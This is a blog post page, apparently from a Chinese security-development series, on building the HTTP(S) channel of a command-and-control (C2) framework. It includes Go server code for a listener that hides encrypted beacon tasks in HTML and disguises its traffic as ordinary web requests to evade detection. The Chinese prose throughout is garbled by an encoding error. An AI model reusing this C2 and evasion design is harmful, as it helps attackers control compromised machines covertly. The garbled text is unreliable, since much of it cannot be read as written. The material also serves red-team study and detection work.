<!DOCTYPE html>
<html lang="en" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="John Doe" />
  <!-- Open Graph Description ç®€çŸ­æ‘˜è¦-->
  
  <!-- ç”¨äºæœç´¢å¼•æ“çš„æ–‡ç« æ‘˜è¦ -->
  
  
  
  <title>
    
      C2é€šä¿¡åè®®è§£æï¼ˆä¸€ï¼‰ï¼šHTTP(s)ã€mTLSã€WebSocketã€DNS 
      
      
      |
    
     Hexo
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.jpg">
    <link rel="icon" href="/images/favicon.jpg">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- ä»£ç å—é£æ ¼ -->
  
    
<link rel="stylesheet" href="/css/figcaption/mac-block.css">

  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- å¤´åƒå–æ¶ˆæ‡’åŠ è½½ï¼Œæ·»åŠ no-lazy -->
      
        <img src="/images/avatar.jpg" alt="">
      
    </a>
    <div class="nickname"><a href="/">oneday</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- æ–‡ç« è¯¦æƒ…é¡µï¼Œå±•ç¤ºæ–‡ç« å…·ä½“å†…å®¹ï¼Œurlå½¢å¼ï¼šhttps://yoursite/æ–‡ç« æ ‡é¢˜/ -->
<!-- åŒæ—¶ä¸ºã€Œæ ‡ç­¾tagã€ï¼Œã€Œæœ‹å‹friendã€ï¼Œã€Œåˆ†ç±»categoriesã€ï¼Œã€Œå…³äºaboutã€é¡µé¢çš„æ‰¿è½½é¡µé¢ï¼Œå…·ä½“å±•ç¤ºå–å†³äºpage.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- æ–‡ç« å†…å®¹é¡µ urlå½¢å¼ï¼šhttps://yoursite/æ–‡ç« æ ‡é¢˜/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">C2é€šä¿¡åè®®è§£æï¼ˆä¸€ï¼‰ï¼šHTTP(s)ã€mTLSã€WebSocketã€DNS</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
          2025-10-14 21:59:51
        </span>
        
              <span class="post-categories">
                <i class="iconfont icon-bookmark" title="Categories"></i>
                
                <span class="span--category">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-C2/" title="å®‰å…¨å¼€å‘_C2">
                    <b>#</b> å®‰å…¨å¼€å‘_C2
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <blockquote>
<p>é¡¹ç›®åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://github.com/onedays12/C2Protocol">https://github.com/onedays12/C2Protocol</a></p>
</blockquote>
<p>ã€Šå®‰å…¨å¼€å‘-C2ã€‹æ˜¯ç³»åˆ—æ–‡ç« ï¼Œæœ¬æ–‡æ˜¯å…¶å­ä¸»é¢˜ã€Šé€šä¿¡åè®®ã€‹ï¼Œæˆ‘å¯ä»¥æ˜ç¡®çš„è¯´ä¸€å®šä¼šæœ‰ç¬¬äºŒç¯‡å’Œç¬¬ä¸‰ç¯‡ï¼Œå°æ¦‚ç‡æœ‰ç¬¬å››ç¯‡ï¼Œæ¯ç¯‡æ–‡ç« ä»‹ç»4æˆ–5ä¸ªC2åè®®ï¼ŒåŒ…å«äº†åˆ°ç›®å‰ä¸ºæ­¢æˆ‘å¯¹C2é€šä¿¡åè®®çš„æ‰€æœ‰ç†è§£ï¼Œå¦‚æœ‰é”™è¯¯åœ°æ–¹è¿˜è¯·å„ä½å¸ˆå‚…æŒ‡å‡ºï¼</p>
<p>æœ¬æ–‡æ¶‰åŠåˆ°å¤§é‡çš„<strong>TCP&#x2F;IPåè®®æ—</strong>çš„å†…å®¹ï¼Œè™½ç„¶æˆ‘ä¼šåœ¨æœ¬æ–‡ä¸­è¡¥å……ç›¸å…³åè®®çš„çŸ¥è¯†ç‚¹ï¼Œä½†ä¹Ÿåªæ˜¯ä¸€ç¬”å¸¦è¿‡ï¼Œæƒ³äº†è§£æ›´å¤šç»†èŠ‚è¯·å‚é˜…ç½‘ä¸Šèµ„æ–™ï¼</p>
<p>è¿™ç‰‡æ–‡ç« çš„çµæ„Ÿæ¥è‡ªåœ¨ä¸Šä¸€ç¯‡æ–‡ç« ã€Š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18564">ä»é›¶å¼€å§‹æ‰‹æ“C2æ¡†æ¶</a>ã€‹ä¸­æˆ‘æåˆ°äº†ä»»åŠ¡æ•°æ®å¯ä»¥é€šè¿‡å„ç§C2åè®®ä¼ è¾“ï¼Œé‚£æ—¶çš„æˆ‘å¹¶æ²¡æœ‰æ„è¯†åˆ°è¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æ–‡ç« ideaï¼Œåªæƒ³å¿«ç‚¹å†™å®Œæ–‡ç« ç„¶åå¥½å¥½çš„ä¼‘æ¯ä¸€ä¸‹ã€‚</p>
<p>é™å…»æœŸé—´ï¼Œæˆ‘å¶å°”ç¿»é˜…æ—§æ–‡ï¼ˆè¿™è¿˜ç®—ä¼‘æ¯å—ï¼Ÿï¼‰ã€‚é¼ æ ‡åœ¨ä¹¦ç­¾æ æ¥å›æ»‘åŠ¨ï¼Œç›®å…‰æ‰«è¿‡æ ‡é¢˜æ—¶ï¼Œè„‘ä¸­çªç„¶ç”µå…‰ä¸€é—ªï¼šè¿™ä¸æ­£æ˜¯è§‚å¯Ÿç°ä»£C2å¦‚ä½•è¿­ä»£ä¼ªè£…ã€èº²é¿æµé‡æ£€æµ‹çš„ç»ä½³åˆ‡å…¥å£å—ï¼Ÿèµ¶ç´§æ‰“å¼€Obsidianç„¶ååˆ›å»ºä¸€ç¯‡æ–‡ç« ï¼Œå†™å®Œæ ‡é¢˜åæˆ‘å°±æ‰”åœ¨ä¸€æ—äº†ï¼Œå› ä¸ºæˆ‘çœŸçš„å¾ˆç´¯æ²¡æ—¶é—´å†™ã€‚</p>
<p>è¯´åˆ°åº•ï¼Œè¿™åªæ˜¯ä¸€ç¯‡å†æ™®é€šä¸è¿‡çš„ç¬”è®°ï¼Œå¹¶æ²¡æœ‰è®©äººçœ¼å‰ä¸€äº®çš„ç‚¹ï¼Œæˆ‘æƒ³è¯´çš„è¯´ï¼šï¼š<strong>â€œå˜¿ï¼Œæˆ‘åˆæ¥äº†ï¼Œä»Šå¤©ä¹Ÿå¸¦äº†ç‚¹æ–°ä¸œè¥¿ï¼Œå³ä½¿æ˜¯è€é…’ï¼Œæˆ‘ä¹Ÿç”¨æ–°ç“¶è£…ã€‚â€</strong> æˆ‘åªæ˜¯å°†è‡ªå·±å­¦ä¹ è¿‡ç¨‹ä¸­é‡åˆ°æœ‰æ„æ€çŸ¥è¯†è®°å½•ä¸‹æ¥ç„¶ååˆ†äº«ç»™å„ä½å¸ˆå‚…ã€‚</p>
<h1 id="ä¸€ã€HTTP-HTTPS"><a href="#ä¸€ã€HTTP-HTTPS" class="headerlink" title="ä¸€ã€HTTP&#x2F;HTTPS"></a>ä¸€ã€HTTP&#x2F;HTTPS</h1><p>ç°ä»£C2æ¡†æ¶ä¸­ï¼ŒHTTP(S)åè®®å› å…¶é«˜å¸¦å®½ã€æ™®éæ€§å’ŒåŠ å¯†ç‰¹æ€§ï¼Œæˆä¸ºç†æƒ³çš„é€šä¿¡æ¸ é“ã€‚ä»¥ä¸‹æ˜¯å…³äºHTTP(S)ç›‘å¬å™¨çš„è¯¦ç»†æ„å»ºæŒ‡å—ï¼ŒåŒ…æ‹¬åŸŸå‰ç½®æŠ€æœ¯çš„é›†æˆã€‚</p>
<h2 id="1-1-æ€è·¯æ„å»º"><a href="#1-1-æ€è·¯æ„å»º" class="headerlink" title="1.1 æ€è·¯æ„å»º"></a>1.1 æ€è·¯æ„å»º</h2><p>ç”±äºHTTP(S)åè®®ç›‘å¬å™¨å¤ªè¿‡æ™®éï¼Œæ‰€ä»¥å°±ä¸è¿‡å¤šä»‹ç»HTTP(S)çš„å®šä¹‰äº†ï¼Œç›´æ¥å¼€å§‹æ€è·¯æ„å»ºã€‚</p>
<p><strong>ç¬¬ä¸€ç‚¹ï¼Œä»»åŠ¡æ€ä¹ˆè·å–</strong>ï¼šç›¸ä¿¡çœ‹è¿‡æˆ‘æ–‡ç« çš„å¸ˆå‚…åº”è¯¥ä¼šæ¸…æ¥šï¼Œæˆ‘åœ¨ä¸Šç¯‡æ–‡ç« çš„åŸºç¡€ä¸Šå¤§å¹…åº¦ç®€åŒ–http(sï¼‰ç›‘å¬å™¨çš„ä»£ç ï¼Œè¿™æ ·åšåªæ˜¯ä¿ç•™æœ€æ ¸å¿ƒçš„ä»£ç è®©å„ä½è¯»è€…èƒ½å¤Ÿç›´æ¥æ„Ÿå—åˆ°httpç›‘å¬å™¨æ˜¯å¦‚ä½•å®Œæˆä»»åŠ¡ä¸‹å‘å’Œç»“æœå›ä¼ çš„ã€‚Serverå…ˆèµ·ä¸€ä¸ªHTTP&#x2F;HTTPS ç›‘å¬å™¨ï¼ˆ<code>IS_HTTPS</code> å†³å®šåè®®ç±»å‹ï¼‰ï¼Œéšååœ¨ç›‘å¬å™¨ä¸ŠæŒ‰è‡ªå®šä¹‰URIæ³¨å†Œè·¯ç”±ã€‚è·¯ç”±å‘Šè¯‰Beaconâ€œä»å“ªè®¿é—®æœåŠ¡â€â€”â€”ä¹Ÿå°±æ˜¯ç”¨ä»€ä¹ˆmethod+URIçš„ç»„åˆæ¥æ‹¿ä»»åŠ¡å’Œå›ä¼ ç»“æœã€‚</p>
<p>HTTP&#x2F;HTTPSç›‘å¬å™¨æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œä»»ä½•æ”¯æŒç¼–å†™HTTPæœåŠ¡å™¨çš„æ¡†æ¶éƒ½èƒ½å¤Ÿå®ç°ç›‘å¬å™¨ï¼Œæ ¹æ®è¿™æ®µæ—¶é—´çš„ä»£ç ç¼–å†™ç»å†ï¼Œä¸ªäººè¿˜æ˜¯å–œæ¬¢ç”¨ginæ¥ç¼–å†™httpæœåŠ¡å™¨ï¼Œå½“ç„¶goçš„æ ‡å‡†åº“ <code>net/http</code> ä¹Ÿå¯ä»¥å†™ï¼Œåªæ˜¯æ²¡è¿™ä¹ˆæ–¹ä¾¿ã€‚</p>
<p>æ—¢ç„¶ç›‘å¬å™¨æœ¬èº«æ˜¯ä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªhtmlçš„æ¨¡æ¿ï¼Œåœ¨htmlé‡Œæ”¾ç½®placeholderï¼ˆå ä½ç¬¦ï¼‰ï¼Œå½“Beaconé€šè¿‡Getçš„æ–¹å¼æ¥å–ä»»åŠ¡æ•°æ®ï¼Œæˆ‘ä»¬å°±å°†åŠ å¯†åçš„ä»»åŠ¡æ•°æ®åµŒå…¥åˆ°htmlé‡Œï¼Œç„¶åä½œä¸ºç»“æœè¿”å›ç»™Beaconã€‚</p>
<p><strong>ç¬¬äºŒç‚¹ï¼Œä¸éœ€è¦ä»»åŠ¡é˜Ÿåˆ—</strong>ï¼šä¸€èˆ¬æƒ…å†µä¸‹ï¼Œéœ€è¦ç»™ç›‘å¬å™¨åˆ›å»ºä¸€ä¸ªä»»åŠ¡é˜Ÿåˆ—ï¼Œå¯æ˜¯è¿™æ ·åšä»£ç é‡åˆæ˜¯ç›´æ¥é£™å‡ï¼Œè¿™ç¯‡æ–‡ç« åªæ˜¯æ¢è®¨C2åè®®ï¼Œä¸æ˜¯æ­å»ºå®Œæ•´çš„C2æ¡†æ¶ï¼Œä¸å¦‚ç›´æ¥ç¡¬ç¼–ç å‘½ä»¤ï¼Œä¸çŸ¥é“å„ä½å¸ˆå‚…è§‰å¾—å¦‚ä½•å‘¢ğŸ˜‹</p>
<p><strong>ç¬¬ä¸‰ç‚¹ï¼Œæ€ä¹ˆæ‰§è¡Œä»»åŠ¡</strong>ï¼šåœ¨ç¬¬ä¸€ç‚¹ä¸­æˆ‘è¯´äº†ï¼Œä»»åŠ¡æ•°æ®æ˜¯å­˜æ”¾åœ¨htmlé‡Œçš„ï¼Œbeaconæ¥æ”¶åˆ°htmlï¼Œæ ¹æ®æ­£åˆ™åŒ¹é…è·å–ä»»åŠ¡æ•°æ®ï¼Œç„¶åè§£å¯†ä»»åŠ¡æ•°æ®è·å–å‘½ä»¤ï¼Œè¿™æ ·å°±å¯ä»¥æ‰§è¡Œäº†ã€‚éœ€è¦è¯´æ˜çš„æ˜¯æœ¬æ–‡çš„ç¤ºä¾‹ä¸­åªèƒ½å¤Ÿæ‰§è¡Œcmdå‘½ä»¤ï¼Œæ‰§è¡Œä¸äº†å¤æ‚çš„å‘½ä»¤ï¼Œç†ç”±è§ä¸‹ä¸€å°ç‚¹ã€‚</p>
<p><strong>ç¬¬å››ç‚¹ï¼ŒJSONæ‰“åŒ…ä¸‡å²</strong>ï¼šåœ¨æœ¬æ–‡ä¸­æ‰€æœ‰C2åè®®æˆ‘ä¸æƒ³åœ¨ä»£ç ä¸­å®ç°è‡ªå®šä¹‰æ‰“åŒ…å™¨äº†ï¼Œè™½ç„¶å®ƒçš„å¯æ‰©å±•æ€§å¾ˆé«˜ï¼Œå¯æ˜¯æˆ‘æ‡’å¾—å®ç°ï¼ç”¨goçš„ <code>encoding/json</code> ä¸€æŠŠæ¢­ï¼Œå¯ä»¥é‡Šæ”¾å¤§è„‘ï¼Œç„¶è€Œè¿™æ ·åšçš„åæœå°±æ˜¯ä»»åŠ¡æ•°æ®å’Œç»“æœæ•°æ®å¿…é¡»ä¸¥æ ¼éµå®ˆjsonçš„æ ¼å¼ï¼Œè¿™ç§æ–¹å¼æ˜¾ç„¶ä¸é€‚åˆå®æˆ˜ã€‚</p>
<p><strong>ç¬¬äº”ç‚¹ï¼Œç»“æœå›ä¼ </strong>ï¼šmetadataå’Œä»»åŠ¡æ‰§è¡Œçš„ç»“æœç”¨jsonååºåˆ—åŒ–ï¼Œç„¶åbeaconå†ä»¥POSTçš„æ–¹å¼è®¿é—®æ¥å£ï¼Œæäº¤æ•°æ®ç»™Serverã€‚Serverä¸­æœ‰ä¸“é—¨ç»“æœå›ä¼ çš„å‡½æ•°ï¼Œå…¶å®ä¸ç”¨è¿‡å¤šå¤„ç†ç»“æœï¼Œç›´æ¥æ‰“å°å°±å®Œäº‹äº†ã€‚</p>
<p><strong>ç¬¬å…­ç‚¹ï¼Œæµé‡è§„é¿</strong>ï¼šä¸ºäº†ä½¿Beaconä¸Serverä¹‹é—´çš„é€šä¿¡æµé‡çœ‹èµ·æ¥åƒæ­£å¸¸çš„HTTPæ•°æ®ï¼Œéœ€è¦ç»™æ“ä½œå‘˜è‡ªå®šä¹‰æµé‡çš„æƒé™ã€‚å…·ä½“æ¥è¯´å°±æ˜¯æ˜¯å¦å¼€å¯SSLã€è‡ªå®šä¹‰å“åº”å¤´ã€HOSTã€PORTã€URIã€è¯ä¹¦ã€è¿”å›ç»™beaconçš„htmlå†…å®¹ç­‰ã€‚</p>
<p>æ‰€æœ‰æ§åˆ¶çš„å‚æ•°éƒ½å†™åœ¨server.goçš„å¼€å¤´ï¼Œéƒ½æ˜¯ä¸ºäº†ä¿è¯æ›´åƒâ€œæ­£å¸¸çš„æµé‡â€ï¼Œå½“ç„¶å¯æ§çš„å‚æ•°å¹¶ä¸å®Œæ•´ï¼Œè¯»è€…å¯ä»¥è‡ªè¡Œæ¢ç©¶ï¼Œæ¯”å¦‚è¯´è¿”å›çš„htmlé¡µé¢å¯ä»¥ä¿®æ”¹æˆæŸæŸåå°ç®¡ç†ç³»ç»Ÿï¼Œè®©aiåˆ†æä¸€ä¸‹æµé‡ï¼Œå¦‚æœåˆ†ææ˜¯æ­£å¸¸æµé‡ä¹Ÿå°±å·®ä¸å¤šäº†ï¼Œå½“ç„¶æœ¬æ–‡æˆ‘æ²¡è¿™ä¹ˆåšã€‚</p>
<h2 id="1-2-ä»£ç å®ç°"><a href="#1-2-ä»£ç å®ç°" class="headerlink" title="1.2 ä»£ç å®ç°"></a>1.2 ä»£ç å®ç°</h2><h3 id="1-2-1-Server"><a href="#1-2-1-Server" class="headerlink" title="1.2.1 Server"></a>1.2.1 Server</h3><p>è¿™å°±æ˜¯æ‰€è°“çš„å¯æ§å‚æ•°ï¼Œåœ¨å®é™…çš„C2æ¡†æ¶ä¸­ï¼Œè¿™äº›éƒ½æ˜¯æ“ä½œå‘˜ï¼ˆå‰ç«¯GUIæˆ–è€…webï¼‰ä¼ è¾“åˆ°Serverï¼Œç„¶åserveræ ¹æ®è¿™äº›å‚æ•°å¯åŠ¨ç›‘å¬å™¨å’Œç”ŸæˆBeaconé…ç½®ã€‚ä¸»è¦ä»‹ç»ListenerStartã€parseBeatã€processRequestã€processResponseå’Œmainæ–¹æ³•ï¼Œå…¶ä»–å·¥å…·å‡½æ•°ä¸è¯¦ç»†è¯´äº†ï¼Œå…·ä½“ä»£ç å»githubçœ‹å°±è¡Œã€‚</p>
<p>å¯æ§å‚æ•°</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (  </span><br><span class="line">    HOST          = <span class="string">&quot;0.0.0.0&quot;</span>  </span><br><span class="line">    PORT          = <span class="number">9090</span>  </span><br><span class="line">    URI           = <span class="string">&quot;/cdn-cgi/trace&quot;</span>  </span><br><span class="line">    IS_HTTPS      = <span class="literal">false</span>  </span><br><span class="line">    SSLCertPath   = <span class="string">&quot;static/server.crt&quot;</span>  </span><br><span class="line">    SSLKeyPath    = <span class="string">&quot;static/server.key&quot;</span>  </span><br><span class="line">    payloadPath   = <span class="string">&quot;static/payload.html&quot;</span>  </span><br><span class="line">    pageErrorPath = <span class="string">&quot;static/404.html&quot;</span>  </span><br><span class="line">    HBHeader      = <span class="string">&quot;X-Session-Id&quot;</span>  </span><br><span class="line">    HBPrefix      = <span class="string">&quot;session=&quot;</span>  </span><br><span class="line">    EncryptKey    = <span class="string">&quot;01234567890123456789&quot;</span>  </span><br><span class="line">    placeholder   = <span class="string">&quot;&#123;&#123;.Cmd&#125;&#125;&quot;</span>  </span><br><span class="line">    taskData      = <span class="string">&quot;ipconfig&quot;</span>  </span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>çš„ListenerStartæ–¹æ³•</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ListenerStart</span><span class="params">()</span></span> *http.Server &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> err <span class="type">error</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// è®¾ç½®ginçš„æ¨¡å¼ä¸ºdebugæ¨¡å¼å¹¶æ³¨å†Œè·¯ç”±  </span></span><br><span class="line">    gin.SetMode(gin.DebugMode)  </span><br><span class="line">    router := gin.New()  </span><br><span class="line">    router.GET(URI, processRequest)  </span><br><span class="line">    router.POST(URI, processResponse)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// åˆ›å»ºhttpæœåŠ¡å¯¹è±¡  </span></span><br><span class="line">    server := &amp;http.Server&#123;  </span><br><span class="line">       Addr:    fmt.Sprintf(<span class="string">&quot;%s:%d&quot;</span>, HOST, PORT),  </span><br><span class="line">       Handler: router,  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// å¯åŠ¨httpsæœåŠ¡æˆ–httpæœåŠ¡  </span></span><br><span class="line">    <span class="keyword">if</span> IS_HTTPS &#123;  </span><br><span class="line">       <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;  </span><br><span class="line">          err = server.ListenAndServeTLS(SSLCertPath, SSLKeyPath)  </span><br><span class="line">          <span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; !errors.Is(err, http.ErrServerClosed) &#123;  </span><br><span class="line">             fmt.Printf(<span class="string">&quot;Error starting HTTPS server: %v\n&quot;</span>, err)  </span><br><span class="line">             <span class="keyword">return</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">       &#125;()  </span><br><span class="line">  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;   Started listener: https://%s:%d%s\n&quot;</span>, HOST, PORT, URI)  </span><br><span class="line">  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">       <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;  </span><br><span class="line">          err = server.ListenAndServe()  </span><br><span class="line">          <span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; !errors.Is(err, http.ErrServerClosed) &#123;  </span><br><span class="line">             fmt.Printf(<span class="string">&quot;Error starting HTTP server: %v\n&quot;</span>, err)  </span><br><span class="line">             <span class="keyword">return</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">       &#125;()  </span><br><span class="line">  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;   Started listener: http://%s:%d%s\n&quot;</span>, HOST, PORT, URI)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> server  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ®µä»£ç çš„åŠŸèƒ½ä¸»è¦æ˜¯ä½¿ç”¨Ginæ¡†æ¶ç”Ÿæˆä¸€ä¸ªrouterï¼ˆæœ¬è´¨æ˜¯ä¸€ä¸ª <code>*Engine</code>ï¼Œèƒ½å¤Ÿå¯åŠ¨æœåŠ¡å™¨ï¼‰ï¼Œç„¶åæ ¹æ®HOST, PORTã€routeråˆ›å»ºä¸€ä¸ªhttp.Serverå®ä¾‹ã€‚æ¥ç€æ ¹æ® <code>IS_HTTPS</code> æ¥å†³å®šå¯åŠ¨HTTPæœåŠ¡å™¨è¿˜æ˜¯HTTPSæœåŠ¡å™¨ï¼Œè¯´å®è¯httpå’Œhttpsåœ¨æ•°æ®çš„åŠ å¯†å±‚é¢åŒºåˆ«ä¸å¤§ï¼Œå› ä¸ºä¸ç®¡æ˜¯httpå’Œhttpsï¼Œåœ¨æ•°æ®ä¼ è¾“ä¹‹å‰éƒ½ä¼šå…ˆè¿›è¡Œä¸€éRC4åŠ å¯†ï¼ˆå¯ä½¿ç”¨AESï¼Œæ›´å®‰å…¨ï¼‰ã€‚</p>
<p>parseBeatæ–¹æ³•</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">parseBeat</span><span class="params">(ctx *gin.Context)</span></span> <span class="type">error</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 1. è§£æ Cookie é‡Œçš„ SESSIONID    </span></span><br><span class="line">    cookie := ctx.Request.Header.Get(HBHeader)  </span><br><span class="line">    <span class="keyword">if</span> !strings.HasPrefix(cookie, HBPrefix) &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;no SESSIONID in cookie&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    beatB64 := strings.TrimPrefix(cookie, HBPrefix)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 2. base64url è§£ç   </span></span><br><span class="line">    beaconInfoCrypt, err := base64.RawURLEncoding.DecodeString(beatB64)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> || <span class="built_in">len</span>(beaconInfoCrypt) &lt; <span class="number">8</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;failed to decode beat&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 3. RC4 è§£å¯†  </span></span><br><span class="line">    rc4crypt, err := rc4.NewCipher([]<span class="type">byte</span>(EncryptKey))  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;rc4 decrypt error&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    beaconInfo := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(beaconInfoCrypt))  </span><br><span class="line">    rc4crypt.XORKeyStream(beaconInfo, beaconInfoCrypt)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 4. è¾“å‡ºmetaData  </span></span><br><span class="line">    metaData := <span class="type">string</span>(beaconInfo)  </span><br><span class="line">    fmt.Printf(<span class="string">&quot;   Beat metaData: %s\n&quot;</span>, metaData)  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨C2è¿œæ§ä¸­ï¼ŒBeaconé¦–æ¬¡ä¸Šçº¿æˆ–é‡è¿æ—¶å‘é€ <code>Metadata</code>ï¼ˆåœ¨æœ¬æ–‡ä¸­HeartBeatå’ŒMetadataæ˜¯åŒä¸€ä¸ªä¸œè¥¿ï¼Œä½†æ˜¯åœ¨ä¸åŒæ–‡ç« ä¸­å®ƒä»¬è¿˜æ˜¯æœ‰å¾ˆå¤§åŒºåˆ«ï¼‰ï¼Œ<code>Metadata</code> é€šå¸¸åŒ…å«äº†<strong>ä¸»æœºä¿¡æ¯</strong>ï¼ˆä¸»æœºåã€ç”¨æˆ·åã€ç³»ç»Ÿç‰ˆæœ¬ã€è¿›ç¨‹æƒé™ã€ç½‘ç»œé…ç½®ç­‰ï¼‰å’Œ<strong>ä¼šè¯å¯†é’¥</strong>ï¼ˆæœ¬æ–‡ä¸­ä¸å®ç°ï¼‰ã€‚</p>
